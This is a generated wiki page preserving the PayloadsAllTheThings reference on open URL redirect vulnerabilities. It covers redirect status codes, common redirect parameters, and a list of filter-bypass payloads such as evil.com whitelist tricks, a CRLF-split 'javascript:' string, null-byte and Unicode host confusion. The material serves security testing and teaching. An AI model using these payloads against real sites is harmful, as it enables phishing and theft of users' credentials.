---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Open URL Redirect

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-open-redirect-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Open Redirect/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Open URL Redirect](../../topics/open-redirect/open-url-redirect.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-open-redirect-readme |
| name | Open URL Redirect |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md |

## Preserved Source Material

````yaml
_body: "# Open URL Redirect\n\n> Un-validated redirects and forwards are possible when a web application accepts untrusted\
  \ input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying\
  \ untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.\
  \ Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy\
  \ appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the\
  \ application’s access control check and then forward the attacker to privileged functions that they would normally not\
  \ be able to access.\n\n## Summary\n\n* [Methodology](#methodology)\n    * [HTTP Redirection Status Code](#http-redirection-status-code)\n\
  \    * [Redirect Methods](#redirect-methods)\n        * [Path-based Redirects](#path-based-redirects)\n        * [JavaScript-based\
  \ Redirects](#javascript-based-redirects)\n        * [Common Query Parameters](#common-query-parameters)\n    * [Filter\
  \ Bypass](#filter-bypass)\n* [Labs](#labs)\n* [References](#references)\n\n## Methodology\n\nAn open redirect vulnerability\
  \ occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can\
  \ allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.\n\nAttackers\
  \ can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their\
  \ consent.\n\n**Example**: A web application has a feature that allows users to click on a link and be automatically redirected\
  \ to a saved preferred homepage. This might be implemented like so:\n\n```ps1\nhttps://example.com/redirect?url=https://userpreferredsite.com\n\
  ```\n\nAn attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious\
  \ website. They could then distribute this link in a phishing email or on another website. When users click the link, they're\
  \ taken to the malicious website.\n\n## HTTP Redirection Status Code\n\nHTTP Redirection status codes, those starting with\
  \ 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:\n\
  \n* [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response.\
  \ The client should choose one of them.\n* [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource\
  \ requested has been permanently moved to the URL given by the Location headers. All future requests should use the new\
  \ URI.\n* [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily\
  \ moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved,\
  \ just that it is temporarily located somewhere else.\n* [303 See Other](https://httpstatuses.com/303) - The server sends\
  \ this response to direct the client to get the requested resource at another URI with a GET request.\n* [304 Not Modified](https://httpstatuses.com/304)\
  \ - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue\
  \ to use the same cached version of the response.\n* [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource\
  \ must be accessed through a proxy provided in the Location header.\n* [307 Temporary Redirect](https://httpstatuses.com/307)\
  \ - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future\
  \ requests should still use the original URI.\n* [308 Permanent Redirect](https://httpstatuses.com/308) - This means the\
  \ resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI.\
  \ It is similar to 301 but does not allow the HTTP method to change.\n\n## Redirect Methods\n\n### Path-based Redirects\n\
  \nInstead of query parameters, redirection logic may rely on the path:\n\n* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`\n\
  * Injecting relative paths: `https://example.com/redirect/../http://malicious.com`\n\n### JavaScript-based Redirects\n\n\
  If the application uses JavaScript for redirects, attackers may manipulate script variables:\n\n**Example**:\n\n```js\n\
  var redirectTo = \"http://trusted.com\";\nwindow.location = redirectTo;\n```\n\n**Payload**: `?redirectTo=http://malicious.com`\n\
  \n### Common Query Parameters\n\n```powershell\n?checkout_url={payload}\n?continue={payload}\n?dest={payload}\n?destination={payload}\n\
  ?go={payload}\n?image_url={payload}\n?next={payload}\n?redir={payload}\n?redirect_uri={payload}\n?redirect_url={payload}\n\
  ?redirect={payload}\n?return_path={payload}\n?return_to={payload}\n?return={payload}\n?returnTo={payload}\n?rurl={payload}\n\
  ?target={payload}\n?url={payload}\n?view={payload}\n/{payload}\n/redirect/{payload}\n```\n\n## Filter Bypass\n\n* Using\
  \ a whitelisted domain or keyword\n\n    ```powershell\n    www.whitelisted.com.evil.com redirect to evil.com\n    ```\n\
  \n* Using **CRLF** to bypass \"javascript\" blacklisted keyword\n\n    ```powershell\n    java%0d%0ascript%0d%0a:alert(0)\n\
  \    ```\n\n* Using \"`//`\" and \"`////`\" to bypass \"http\" blacklisted keyword\n\n    ```powershell\n    //google.com\n\
  \    ////google.com\n    ```\n\n* Using \"https:\" to bypass \"`//`\" blacklisted keyword\n\n    ```powershell\n    https:google.com\n\
  \    ```\n\n* Using \"`\\/\\/`\" to bypass \"`//`\" blacklisted keyword\n\n    ```powershell\n    \\/\\/google.com/\n  \
  \  /\\/google.com/\n    ```\n\n* Using \"`%E3%80%82`\" to bypass \".\" blacklisted character\n\n    ```powershell\n    /?redir=google。com\n\
  \    //google%E3%80%82com\n    ```\n\n* Using null byte \"`%00`\" to bypass blacklist filter\n\n    ```powershell\n    //google%00.com\n\
  \    ```\n\n* Using HTTP Parameter Pollution\n\n    ```powershell\n    ?next=whitelisted.com&next=google.com\n    ```\n\n\
  * Using \"@\" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)\n\n    ```powershell\n\
  \    //<user>:<password>@<host>:<port>/<url-path>\n    http://www.theirsite.com@yoursite.com/\n    ```\n\n* Creating folder\
  \ as their domain\n\n    ```powershell\n    http://www.yoursite.com/http://www.theirsite.com/\n    http://www.yoursite.com/folder/www.folder.com\n\
  \    ```\n\n* Using \"`?`\" character, browser will translate it to \"`/?`\"\n\n    ```powershell\n    http://www.yoursite.com?http://www.theirsite.com/\n\
  \    http://www.yoursite.com?folder/www.folder.com\n    ```\n\n* Host/Split Unicode Normalization\n\n    ```powershell\n\
  \    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com\n    http://a.com／X.b.com\n    ```\n\n## Labs\n\n\
  * [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)\n* [PortSwigger\
  \ - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)\n\
  \n## References\n\n* [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://web.archive.org/web/20190819081715/https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)\n\
  * [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://web.archive.org/web/20190719012735/https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)\n\
  * [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://web.archive.org/web/20180816184136/https://s0cket7.com/open-redirect-vulnerability/)\n\
  * [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)\n*\
  \ [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://web.archive.org/web/20130423163025/https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)\n\
  * [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) -\
  \ May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)"
_relative_path: Open Redirect/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Open Redirect/README.md
````
